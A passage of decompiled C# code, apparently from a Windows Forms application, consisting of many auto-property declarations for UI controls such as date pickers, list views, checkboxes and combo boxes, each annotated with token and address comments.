		// Token: 0x17000730 RID: 1840
		// (get) Token: 0x06000ECE RID: 3790 RVA: 0x0004F163 File Offset: 0x0004D363
		// (set) Token: 0x06000ECF RID: 3791 RVA: 0x0004F16B File Offset: 0x0004D36B
		internal virtual DateTimePicker DateTimePicker22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000731 RID: 1841
		// (get) Token: 0x06000ED0 RID: 3792 RVA: 0x0004F174 File Offset: 0x0004D374
		// (set) Token: 0x06000ED1 RID: 3793 RVA: 0x0004F17C File Offset: 0x0004D37C
		internal virtual DateTimePicker DateTimePicker23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000732 RID: 1842
		// (get) Token: 0x06000ED2 RID: 3794 RVA: 0x0004F185 File Offset: 0x0004D385
		// (set) Token: 0x06000ED3 RID: 3795 RVA: 0x0004F18D File Offset: 0x0004D38D
		internal virtual MonthCalendar MonthCalendar8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000733 RID: 1843
		// (get) Token: 0x06000ED4 RID: 3796 RVA: 0x0004F196 File Offset: 0x0004D396
		// (set) Token: 0x06000ED5 RID: 3797 RVA: 0x0004F19E File Offset: 0x0004D39E
		internal virtual Label Label15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000734 RID: 1844
		// (get) Token: 0x06000ED6 RID: 3798 RVA: 0x0004F1A7 File Offset: 0x0004D3A7
		// (set) Token: 0x06000ED7 RID: 3799 RVA: 0x0004F1AF File Offset: 0x0004D3AF
		internal virtual ListView ListView23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000735 RID: 1845
		// (get) Token: 0x06000ED8 RID: 3800 RVA: 0x0004F1B8 File Offset: 0x0004D3B8
		// (set) Token: 0x06000ED9 RID: 3801 RVA: 0x0004F1C0 File Offset: 0x0004D3C0
		internal virtual PictureBox PictureBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000736 RID: 1846
		// (get) Token: 0x06000EDA RID: 3802 RVA: 0x0004F1C9 File Offset: 0x0004D3C9
		// (set) Token: 0x06000EDB RID: 3803 RVA: 0x0004F1D1 File Offset: 0x0004D3D1
		internal virtual CheckedListBox CheckedListBox32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000737 RID: 1847
		// (get) Token: 0x06000EDC RID: 3804 RVA: 0x0004F1DA File Offset: 0x0004D3DA
		// (set) Token: 0x06000EDD RID: 3805 RVA: 0x0004F1E2 File Offset: 0x0004D3E2
		internal virtual Label Label16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000738 RID: 1848
		// (get) Token: 0x06000EDE RID: 3806 RVA: 0x0004F1EB File Offset: 0x0004D3EB
		// (set) Token: 0x06000EDF RID: 3807 RVA: 0x0004F1F3 File Offset: 0x0004D3F3
		internal virtual DateTimePicker DateTimePicker24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000739 RID: 1849
		// (get) Token: 0x06000EE0 RID: 3808 RVA: 0x0004F1FC File Offset: 0x0004D3FC
		// (set) Token: 0x06000EE1 RID: 3809 RVA: 0x0004F204 File Offset: 0x0004D404
		internal virtual ComboBox ComboBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700073A RID: 1850
		// (get) Token: 0x06000EE2 RID: 3810 RVA: 0x0004F20D File Offset: 0x0004D40D
		// (set) Token: 0x06000EE3 RID: 3811 RVA: 0x0004F215 File Offset: 0x0004D415
		internal virtual CheckedListBox CheckedListBox33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700073B RID: 1851
		// (get) Token: 0x06000EE4 RID: 3812 RVA: 0x0004F21E File Offset: 0x0004D41E
		// (set) Token: 0x06000EE5 RID: 3813 RVA: 0x0004F226 File Offset: 0x0004D426
		internal virtual ListView ListView24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700073C RID: 1852
		// (get) Token: 0x06000EE6 RID: 3814 RVA: 0x0004F22F File Offset: 0x0004D42F
		// (set) Token: 0x06000EE7 RID: 3815 RVA: 0x0004F237 File Offset: 0x0004D437
		internal virtual MaskedTextBox MaskedTextBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700073D RID: 1853
		// (get) Token: 0x06000EE8 RID: 3816 RVA: 0x0004F240 File Offset: 0x0004D440
		// (set) Token: 0x06000EE9 RID: 3817 RVA: 0x0004F248 File Offset: 0x0004D448
		internal virtual ListView ListView25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700073E RID: 1854
		// (get) Token: 0x06000EEA RID: 3818 RVA: 0x0004F251 File Offset: 0x0004D451
		// (set) Token: 0x06000EEB RID: 3819 RVA: 0x0004F259 File Offset: 0x0004D459
		internal virtual CheckedListBox CheckedListBox34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700073F RID: 1855
		// (get) Token: 0x06000EEC RID: 3820 RVA: 0x0004F262 File Offset: 0x0004D462
		// (set) Token: 0x06000EED RID: 3821 RVA: 0x0004F26A File Offset: 0x0004D46A
		internal virtual ComboBox ComboBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000740 RID: 1856
		// (get) Token: 0x06000EEE RID: 3822 RVA: 0x0004F273 File Offset: 0x0004D473
		// (set) Token: 0x06000EEF RID: 3823 RVA: 0x0004F27B File Offset: 0x0004D47B
		internal virtual RadioButton RadioButton9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000741 RID: 1857
		// (get) Token: 0x06000EF0 RID: 3824 RVA: 0x0004F284 File Offset: 0x0004D484
		// (set) Token: 0x06000EF1 RID: 3825 RVA: 0x0004F28C File Offset: 0x0004D48C
		internal virtual ProgressBar ProgressBar9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000742 RID: 1858
		// (get) Token: 0x06000EF2 RID: 3826 RVA: 0x0004F295 File Offset: 0x0004D495
		// (set) Token: 0x06000EF3 RID: 3827 RVA: 0x0004F29D File Offset: 0x0004D49D
		internal virtual DateTimePicker DateTimePicker25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000743 RID: 1859
		// (get) Token: 0x06000EF4 RID: 3828 RVA: 0x0004F2A6 File Offset: 0x0004D4A6
		// (set) Token: 0x06000EF5 RID: 3829 RVA: 0x0004F2AE File Offset: 0x0004D4AE
		internal virtual MonthCalendar MonthCalendar9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000744 RID: 1860
		// (get) Token: 0x06000EF6 RID: 3830 RVA: 0x0004F2B7 File Offset: 0x0004D4B7
		// (set) Token: 0x06000EF7 RID: 3831 RVA: 0x0004F2BF File Offset: 0x0004D4BF
		internal virtual PictureBox PictureBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000745 RID: 1861
		// (get) Token: 0x06000EF8 RID: 3832 RVA: 0x0004F2C8 File Offset: 0x0004D4C8
		// (set) Token: 0x06000EF9 RID: 3833 RVA: 0x0004F2D0 File Offset: 0x0004D4D0
		internal virtual CheckedListBox CheckedListBox35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000746 RID: 1862
		// (get) Token: 0x06000EFA RID: 3834 RVA: 0x0004F2D9 File Offset: 0x0004D4D9
		// (set) Token: 0x06000EFB RID: 3835 RVA: 0x0004F2E1 File Offset: 0x0004D4E1
		internal virtual CheckedListBox CheckedListBox36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000747 RID: 1863
		// (get) Token: 0x06000EFC RID: 3836 RVA: 0x0004F2EA File Offset: 0x0004D4EA
		// (set) Token: 0x06000EFD RID: 3837 RVA: 0x0004F2F2 File Offset: 0x0004D4F2
		internal virtual Label Label17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000748 RID: 1864
		// (get) Token: 0x06000EFE RID: 3838 RVA: 0x0004F2FB File Offset: 0x0004D4FB
		// (set) Token: 0x06000EFF RID: 3839 RVA: 0x0004F303 File Offset: 0x0004D503
		internal virtual DateTimePicker DateTimePicker26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000749 RID: 1865
		// (get) Token: 0x06000F00 RID: 3840 RVA: 0x0004F30C File Offset: 0x0004D50C
		// (set) Token: 0x06000F01 RID: 3841 RVA: 0x0004F314 File Offset: 0x0004D514
		internal virtual ComboBox ComboBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700074A RID: 1866
		// (get) Token: 0x06000F02 RID: 3842 RVA: 0x0004F31D File Offset: 0x0004D51D
		// (set) Token: 0x06000F03 RID: 3843 RVA: 0x0004F325 File Offset: 0x0004D525
		internal virtual CheckedListBox CheckedListBox37 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700074B RID: 1867
		// (get) Token: 0x06000F04 RID: 3844 RVA: 0x0004F32E File Offset: 0x0004D52E
		// (set) Token: 0x06000F05 RID: 3845 RVA: 0x0004F336 File Offset: 0x0004D536
		internal virtual MaskedTextBox MaskedTextBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700074C RID: 1868
		// (get) Token: 0x06000F06 RID: 3846 RVA: 0x0004F33F File Offset: 0x0004D53F
		// (set) Token: 0x06000F07 RID: 3847 RVA: 0x0004F347 File Offset: 0x0004D547
		internal virtual ListView ListView26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700074D RID: 1869
		// (get) Token: 0x06000F08 RID: 3848 RVA: 0x0004F350 File Offset: 0x0004D550
		// (set) Token: 0x06000F09 RID: 3849 RVA: 0x0004F358 File Offset: 0x0004D558
		internal virtual CheckBox CheckBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700074E RID: 1870
		// (get) Token: 0x06000F0A RID: 3850 RVA: 0x0004F361 File Offset: 0x0004D561
		// (set) Token: 0x06000F0B RID: 3851 RVA: 0x0004F369 File Offset: 0x0004D569
		internal virtual MaskedTextBox MaskedTextBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700074F RID: 1871
		// (get) Token: 0x06000F0C RID: 3852 RVA: 0x0004F372 File Offset: 0x0004D572
		// (set) Token: 0x06000F0D RID: 3853 RVA: 0x0004F37A File Offset: 0x0004D57A
		internal virtual CheckBox CheckBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000750 RID: 1872
		// (get) Token: 0x06000F0E RID: 3854 RVA: 0x0004F383 File Offset: 0x0004D583
		// (set) Token: 0x06000F0F RID: 3855 RVA: 0x0004F38B File Offset: 0x0004D58B
		internal virtual ListView ListView27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000751 RID: 1873
		// (get) Token: 0x06000F10 RID: 3856 RVA: 0x0004F394 File Offset: 0x0004D594
		// (set) Token: 0x06000F11 RID: 3857 RVA: 0x0004F39C File Offset: 0x0004D59C
		internal virtual CheckedListBox CheckedListBox38 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000752 RID: 1874
		// (get) Token: 0x06000F12 RID: 3858 RVA: 0x0004F3A5 File Offset: 0x0004D5A5
		// (set) Token: 0x06000F13 RID: 3859 RVA: 0x0004F3AD File Offset: 0x0004D5AD
		internal virtual ComboBox ComboBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000753 RID: 1875
		// (get) Token: 0x06000F14 RID: 3860 RVA: 0x0004F3B6 File Offset: 0x0004D5B6
		// (set) Token: 0x06000F15 RID: 3861 RVA: 0x0004F3BE File Offset: 0x0004D5BE
		internal virtual RadioButton RadioButton10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000754 RID: 1876
		// (get) Token: 0x06000F16 RID: 3862 RVA: 0x0004F3C7 File Offset: 0x0004D5C7
		// (set) Token: 0x06000F17 RID: 3863 RVA: 0x0004F3CF File Offset: 0x0004D5CF
		internal virtual ProgressBar ProgressBar10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000755 RID: 1877
		// (get) Token: 0x06000F18 RID: 3864 RVA: 0x0004F3D8 File Offset: 0x0004D5D8
		// (set) Token: 0x06000F19 RID: 3865 RVA: 0x0004F3E0 File Offset: 0x0004D5E0
		internal virtual Button Button8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000756 RID: 1878
		// (get) Token: 0x06000F1A RID: 3866 RVA: 0x0004F3E9 File Offset: 0x0004D5E9
		// (set) Token: 0x06000F1B RID: 3867 RVA: 0x0004F3F1 File Offset: 0x0004D5F1
		internal virtual CheckBox CheckBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000757 RID: 1879
		// (get) Token: 0x06000F1C RID: 3868 RVA: 0x0004F3FA File Offset: 0x0004D5FA
		// (set) Token: 0x06000F1D RID: 3869 RVA: 0x0004F402 File Offset: 0x0004D602
		internal virtual DateTimePicker DateTimePicker27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000758 RID: 1880
		// (get) Token: 0x06000F1E RID: 3870 RVA: 0x0004F40B File Offset: 0x0004D60B
		// (set) Token: 0x06000F1F RID: 3871 RVA: 0x0004F413 File Offset: 0x0004D613
		internal virtual DateTimePicker DateTimePicker28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000759 RID: 1881
		// (get) Token: 0x06000F20 RID: 3872 RVA: 0x0004F41C File Offset: 0x0004D61C
		// (set) Token: 0x06000F21 RID: 3873 RVA: 0x0004F424 File Offset: 0x0004D624
		internal virtual MonthCalendar MonthCalendar10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700075A RID: 1882
		// (get) Token: 0x06000F22 RID: 3874 RVA: 0x0004F42D File Offset: 0x0004D62D
		// (set) Token: 0x06000F23 RID: 3875 RVA: 0x0004F435 File Offset: 0x0004D635
		internal virtual Label Label18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700075B RID: 1883
		// (get) Token: 0x06000F24 RID: 3876 RVA: 0x0004F43E File Offset: 0x0004D63E
		// (set) Token: 0x06000F25 RID: 3877 RVA: 0x0004F446 File Offset: 0x0004D646
		internal virtual ListView ListView28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700075C RID: 1884
		// (get) Token: 0x06000F26 RID: 3878 RVA: 0x0004F44F File Offset: 0x0004D64F
		// (set) Token: 0x06000F27 RID: 3879 RVA: 0x0004F457 File Offset: 0x0004D657
		internal virtual PictureBox PictureBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700075D RID: 1885
		// (get) Token: 0x06000F28 RID: 3880 RVA: 0x0004F460 File Offset: 0x0004D660
		// (set) Token: 0x06000F29 RID: 3881 RVA: 0x0004F468 File Offset: 0x0004D668
		internal virtual CheckedListBox CheckedListBox39 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700075E RID: 1886
		// (get) Token: 0x06000F2A RID: 3882 RVA: 0x0004F471 File Offset: 0x0004D671
		// (set) Token: 0x06000F2B RID: 3883 RVA: 0x0004F479 File Offset: 0x0004D679
		internal virtual CheckedListBox CheckedListBox40 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700075F RID: 1887
		// (get) Token: 0x06000F2C RID: 3884 RVA: 0x0004F482 File Offset: 0x0004D682
		// (set) Token: 0x06000F2D RID: 3885 RVA: 0x0004F48A File Offset: 0x0004D68A
		internal virtual Label Label19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000760 RID: 1888
		// (get) Token: 0x06000F2E RID: 3886 RVA: 0x0004F493 File Offset: 0x0004D693
		// (set) Token: 0x06000F2F RID: 3887 RVA: 0x0004F49B File Offset: 0x0004D69B
		internal virtual DateTimePicker DateTimePicker29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000761 RID: 1889
		// (get) Token: 0x06000F30 RID: 3888 RVA: 0x0004F4A4 File Offset: 0x0004D6A4
		// (set) Token: 0x06000F31 RID: 3889 RVA: 0x0004F4AC File Offset: 0x0004D6AC
		internal virtual ComboBox ComboBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000762 RID: 1890
		// (get) Token: 0x06000F32 RID: 3890 RVA: 0x0004F4B5 File Offset: 0x0004D6B5
		// (set) Token: 0x06000F33 RID: 3891 RVA: 0x0004F4BD File Offset: 0x0004D6BD
		internal virtual CheckedListBox CheckedListBox41 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000763 RID: 1891
		// (get) Token: 0x06000F34 RID: 3892 RVA: 0x0004F4C6 File Offset: 0x0004D6C6
		// (set) Token: 0x06000F35 RID: 3893 RVA: 0x0004F4CE File Offset: 0x0004D6CE
		internal virtual MaskedTextBox MaskedTextBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000764 RID: 1892
		// (get) Token: 0x06000F36 RID: 3894 RVA: 0x0004F4D7 File Offset: 0x0004D6D7
		// (set) Token: 0x06000F37 RID: 3895 RVA: 0x0004F4DF File Offset: 0x0004D6DF
		internal virtual ListView ListView29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000765 RID: 1893
		// (get) Token: 0x06000F38 RID: 3896 RVA: 0x0004F4E8 File Offset: 0x0004D6E8
		// (set) Token: 0x06000F39 RID: 3897 RVA: 0x0004F4F0 File Offset: 0x0004D6F0
		internal virtual CheckBox CheckBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000766 RID: 1894
		// (get) Token: 0x06000F3A RID: 3898 RVA: 0x0004F4F9 File Offset: 0x0004D6F9
		// (set) Token: 0x06000F3B RID: 3899 RVA: 0x0004F501 File Offset: 0x0004D701
		internal virtual MaskedTextBox MaskedTextBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000767 RID: 1895
		// (get) Token: 0x06000F3C RID: 3900 RVA: 0x0004F50A File Offset: 0x0004D70A
		// (set) Token: 0x06000F3D RID: 3901 RVA: 0x0004F512 File Offset: 0x0004D712
		internal virtual CheckBox CheckBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000768 RID: 1896
		// (get) Token: 0x06000F3E RID: 3902 RVA: 0x0004F51B File Offset: 0x0004D71B
		// (set) Token: 0x06000F3F RID: 3903 RVA: 0x0004F523 File Offset: 0x0004D723
		internal virtual ListView ListView30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000769 RID: 1897
		// (get) Token: 0x06000F40 RID: 3904 RVA: 0x0004F52C File Offset: 0x0004D72C
		// (set) Token: 0x06000F41 RID: 3905 RVA: 0x0004F534 File Offset: 0x0004D734
		internal virtual CheckedListBox CheckedListBox42 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700076A RID: 1898
		// (get) Token: 0x06000F42 RID: 3906 RVA: 0x0004F53D File Offset: 0x0004D73D
		// (set) Token: 0x06000F43 RID: 3907 RVA: 0x0004F545 File Offset: 0x0004D745
		internal virtual ComboBox ComboBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700076B RID: 1899
		// (get) Token: 0x06000F44 RID: 3908 RVA: 0x0004F54E File Offset: 0x0004D74E
		// (set) Token: 0x06000F45 RID: 3909 RVA: 0x0004F556 File Offset: 0x0004D756
		internal virtual RadioButton RadioButton11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700076C RID: 1900
		// (get) Token: 0x06000F46 RID: 3910 RVA: 0x0004F55F File Offset: 0x0004D75F
		// (set) Token: 0x06000F47 RID: 3911 RVA: 0x0004F567 File Offset: 0x0004D767
		internal virtual ProgressBar ProgressBar11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700076D RID: 1901
		// (get) Token: 0x06000F48 RID: 3912 RVA: 0x0004F570 File Offset: 0x0004D770
		// (set) Token: 0x06000F49 RID: 3913 RVA: 0x0004F578 File Offset: 0x0004D778
		internal virtual Button Button9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700076E RID: 1902
		// (get) Token: 0x06000F4A RID: 3914 RVA: 0x0004F581 File Offset: 0x0004D781
		// (set) Token: 0x06000F4B RID: 3915 RVA: 0x0004F589 File Offset: 0x0004D789
		internal virtual CheckBox CheckBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700076F RID: 1903
		// (get) Token: 0x06000F4C RID: 3916 RVA: 0x0004F592 File Offset: 0x0004D792
		// (set) Token: 0x06000F4D RID: 3917 RVA: 0x0004F59A File Offset: 0x0004D79A
		internal virtual DateTimePicker DateTimePicker30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000770 RID: 1904
		// (get) Token: 0x06000F4E RID: 3918 RVA: 0x0004F5A3 File Offset: 0x0004D7A3
		// (set) Token: 0x06000F4F RID: 3919 RVA: 0x0004F5AB File Offset: 0x0004D7AB
		internal virtual DateTimePicker DateTimePicker31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000771 RID: 1905
		// (get) Token: 0x06000F50 RID: 3920 RVA: 0x0004F5B4 File Offset: 0x0004D7B4
		// (set) Token: 0x06000F51 RID: 3921 RVA: 0x0004F5BC File Offset: 0x0004D7BC
		internal virtual MonthCalendar MonthCalendar11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000772 RID: 1906
		// (get) Token: 0x06000F52 RID: 3922 RVA: 0x0004F5C5 File Offset: 0x0004D7C5
		// (set) Token: 0x06000F53 RID: 3923 RVA: 0x0004F5CD File Offset: 0x0004D7CD
		internal virtual Label Label20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000773 RID: 1907
		// (get) Token: 0x06000F54 RID: 3924 RVA: 0x0004F5D6 File Offset: 0x0004D7D6
		// (set) Token: 0x06000F55 RID: 3925 RVA: 0x0004F5DE File Offset: 0x0004D7DE
		internal virtual ListView ListView31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000774 RID: 1908
		// (get) Token: 0x06000F56 RID: 3926 RVA: 0x0004F5E7 File Offset: 0x0004D7E7
		// (set) Token: 0x06000F57 RID: 3927 RVA: 0x0004F5EF File Offset: 0x0004D7EF
		internal virtual PictureBox PictureBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000775 RID: 1909
		// (get) Token: 0x06000F58 RID: 3928 RVA: 0x0004F5F8 File Offset: 0x0004D7F8
		// (set) Token: 0x06000F59 RID: 3929 RVA: 0x0004F600 File Offset: 0x0004D800
		internal virtual CheckedListBox CheckedListBox43 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000776 RID: 1910
		// (get) Token: 0x06000F5A RID: 3930 RVA: 0x0004F609 File Offset: 0x0004D809
		// (set) Token: 0x06000F5B RID: 3931 RVA: 0x0004F611 File Offset: 0x0004D811
		internal virtual CheckedListBox CheckedListBox44 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000777 RID: 1911
		// (get) Token: 0x06000F5C RID: 3932 RVA: 0x0004F61A File Offset: 0x0004D81A
		// (set) Token: 0x06000F5D RID: 3933 RVA: 0x0004F622 File Offset: 0x0004D822
		internal virtual Label Label21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000778 RID: 1912
		// (get) Token: 0x06000F5E RID: 3934 RVA: 0x0004F62B File Offset: 0x0004D82B
		// (set) Token: 0x06000F5F RID: 3935 RVA: 0x0004F633 File Offset: 0x0004D833
		internal virtual DateTimePicker DateTimePicker32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000779 RID: 1913
		// (get) Token: 0x06000F60 RID: 3936 RVA: 0x0004F63C File Offset: 0x0004D83C
		// (set) Token: 0x06000F61 RID: 3937 RVA: 0x0004F644 File Offset: 0x0004D844
		internal virtual ComboBox ComboBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700077A RID: 1914
		// (get) Token: 0x06000F62 RID: 3938 RVA: 0x0004F64D File Offset: 0x0004D84D
		// (set) Token: 0x06000F63 RID: 3939 RVA: 0x0004F655 File Offset: 0x0004D855
		internal virtual CheckedListBox CheckedListBox45 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700077B RID: 1915
		// (get) Token: 0x06000F64 RID: 3940 RVA: 0x0004F65E File Offset: 0x0004D85E
		// (set) Token: 0x06000F65 RID: 3941 RVA: 0x0004F666 File Offset: 0x0004D866
		internal virtual MaskedTextBox MaskedTextBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700077C RID: 1916
		// (get) Token: 0x06000F66 RID: 3942 RVA: 0x0004F66F File Offset: 0x0004D86F
		// (set) Token: 0x06000F67 RID: 3943 RVA: 0x0004F677 File Offset: 0x0004D877
		internal virtual ListView ListView32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700077D RID: 1917
		// (get) Token: 0x06000F68 RID: 3944 RVA: 0x0004F680 File Offset: 0x0004D880
		// (set) Token: 0x06000F69 RID: 3945 RVA: 0x0004F688 File Offset: 0x0004D888
		internal virtual CheckBox CheckBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700077E RID: 1918
		// (get) Token: 0x06000F6A RID: 3946 RVA: 0x0004F691 File Offset: 0x0004D891
		// (set) Token: 0x06000F6B RID: 3947 RVA: 0x0004F699 File Offset: 0x0004D899
		internal virtual MaskedTextBox MaskedTextBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700077F RID: 1919
		// (get) Token: 0x06000F6C RID: 3948 RVA: 0x0004F6A2 File Offset: 0x0004D8A2
		// (set) Token: 0x06000F6D RID: 3949 RVA: 0x0004F6AA File Offset: 0x0004D8AA
		internal virtual CheckBox CheckBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000780 RID: 1920
		// (get) Token: 0x06000F6E RID: 3950 RVA: 0x0004F6B3 File Offset: 0x0004D8B3
		// (set) Token: 0x06000F6F RID: 3951 RVA: 0x0004F6BB File Offset: 0x0004D8BB
		internal virtual ListView ListView33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000781 RID: 1921
		// (get) Token: 0x06000F70 RID: 3952 RVA: 0x0004F6C4 File Offset: 0x0004D8C4
		// (set) Token: 0x06000F71 RID: 3953 RVA: 0x0004F6CC File Offset: 0x0004D8CC
		internal virtual CheckedListBox CheckedListBox46 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000782 RID: 1922
		// (get) Token: 0x06000F72 RID: 3954 RVA: 0x0004F6D5 File Offset: 0x0004D8D5
		// (set) Token: 0x06000F73 RID: 3955 RVA: 0x0004F6DD File Offset: 0x0004D8DD
		internal virtual ComboBox ComboBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000783 RID: 1923
		// (get) Token: 0x06000F74 RID: 3956 RVA: 0x0004F6E6 File Offset: 0x0004D8E6
		// (set) Token: 0x06000F75 RID: 3957 RVA: 0x0004F6EE File Offset: 0x0004D8EE
		internal virtual RadioButton RadioButton12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000784 RID: 1924
		// (get) Token: 0x06000F76 RID: 3958 RVA: 0x0004F6F7 File Offset: 0x0004D8F7
		// (set) Token: 0x06000F77 RID: 3959 RVA: 0x0004F6FF File Offset: 0x0004D8FF
		internal virtual ProgressBar ProgressBar12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000785 RID: 1925
		// (get) Token: 0x06000F78 RID: 3960 RVA: 0x0004F708 File Offset: 0x0004D908
		// (set) Token: 0x06000F79 RID: 3961 RVA: 0x0004F710 File Offset: 0x0004D910
		internal virtual Button Button10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000786 RID: 1926
		// (get) Token: 0x06000F7A RID: 3962 RVA: 0x0004F719 File Offset: 0x0004D919
		// (set) Token: 0x06000F7B RID: 3963 RVA: 0x0004F721 File Offset: 0x0004D921
		internal virtual CheckBox CheckBox30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000787 RID: 1927
		// (get) Token: 0x06000F7C RID: 3964 RVA: 0x0004F72A File Offset: 0x0004D92A
		// (set) Token: 0x06000F7D RID: 3965 RVA: 0x0004F732 File Offset: 0x0004D932
		internal virtual DateTimePicker DateTimePicker33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000788 RID: 1928
		// (get) Token: 0x06000F7E RID: 3966 RVA: 0x0004F73B File Offset: 0x0004D93B
		// (set) Token: 0x06000F7F RID: 3967 RVA: 0x0004F743 File Offset: 0x0004D943
		internal virtual DateTimePicker DateTimePicker34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000789 RID: 1929
